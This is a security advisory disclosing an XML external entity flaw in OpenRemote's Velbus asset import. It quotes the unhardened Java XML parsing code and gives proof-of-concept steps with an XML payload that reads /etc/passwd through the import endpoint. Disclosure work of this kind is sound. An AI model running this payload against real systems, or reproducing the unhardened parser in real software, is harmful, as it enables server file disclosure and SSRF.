# [H] OpenRemote has XXE in Velbus Asset Import

## Summary
Severity: High
Advisory: GHSA-g24f-mgc3-jwwc
CVE: CVE-2026-40882
CWE: CWE-611
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L (CVSS_V3)
Published: 2026-04-15
Source: https://github.com/advisories/GHSA-g24f-mgc3-jwwc
Type: github-advisory

## Affected
- Maven: `io.openremote:openremote-manager` — affected >=0 <1.22.0

## Details
### Summary
The Velbus asset import path parses attacker-controlled XML without explicit XXE hardening. An authenticated user who can call the import endpoint may trigger XML external entity processing, which can lead to server-side file disclosure and SSRF. The target file must be less than 1023 characters.

### Details
Velbus import uses `DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(...)` on untrusted XML input, without explicit safeguards to disable DTD/external entities.

```154:165:agent/src/main/java/org/openremote/agent/protocol/velbus/AbstractVelbusProtocol.java
    @Override
    public Future<Void> startAssetImport(byte[] fileData, Consumer<AssetTreeNode[]> assetConsumer) {

        return executorService.submit(() -> {
            Document xmlDoc;
            try {
                String xmlStr = new String(fileData, StandardCharsets.UTF_8);
                LOG.info("Parsing VELBUS project file");

                xmlDoc = DocumentBuilderFactory
                    .newInstance()
                    .newDocumentBuilder()
                    .parse(new InputSource(new StringReader(xmlStr)));
```

Expanded `Caption` content is propagated into created asset names:

```193:198:agent/src/main/java/org/openremote/agent/protocol/velbus/AbstractVelbusProtocol.java
                String name = module.getElementsByTagName("Caption").item(0).getTextContent();
                name = isNullOrEmpty(name) ? deviceType.toString() : name;

                // TODO: Use device specific asset types
                Asset<?> device = new ThingAsset(name);
```

### PoC
1. Log in to a realm with a user that can call Velbus asset import.
2. Create/select a Velbus TCP Agent in that same realm.
3. Send `POST /api/{realm}/agent/assetImport/{agentId}` with a Velbus project XML payload and compare behavior against a baseline import file.
3. Save the below code as a `xxe.xml` and upload to `Setup` under `https://localhost/manager/?realm=<YOUR_REALM>#/assets/false/<ASSET_ID>`. Chnage the `file:///etc/passwd` to another file if your `passwd` is longer than 1023 characters.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE velbus [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<Project>
  <Module type="VMB1RY" address="01" build="00" serial="LAB">
    <Caption>&xxe;</Caption>
  </Module>
</Project>
```

As long as the file content is under 1023 characters, the exploit will succeed.
<img width="1200" height="662" alt="image" src="https://github.com/user-attachments/assets/213f063d-98b6-4717-b98c-f4255952026b" />

If the file content reaches the limit, an error is thrown.
<img width="1200" height="630" alt="image" src="https://github.com/user-attachments/assets/ee177a6b-2cb2-48ae-94df-c994ecb41429" />


### Impact
- **Type:** XML External Entity (XXE)
- **Affected:** Deployments exposing Velbus import to authenticated users with import access
- **Risk:** limited local file disclosure (as long as the file is under 1023 characters) from the Manager runtime, and SSRF.

## References
- https://github.com/openremote/openremote/security/advisories/GHSA-g24f-mgc3-jwwc
- https://nvd.nist.gov/vuln/detail/CVE-2026-40882
- https://github.com/openremote/openremote
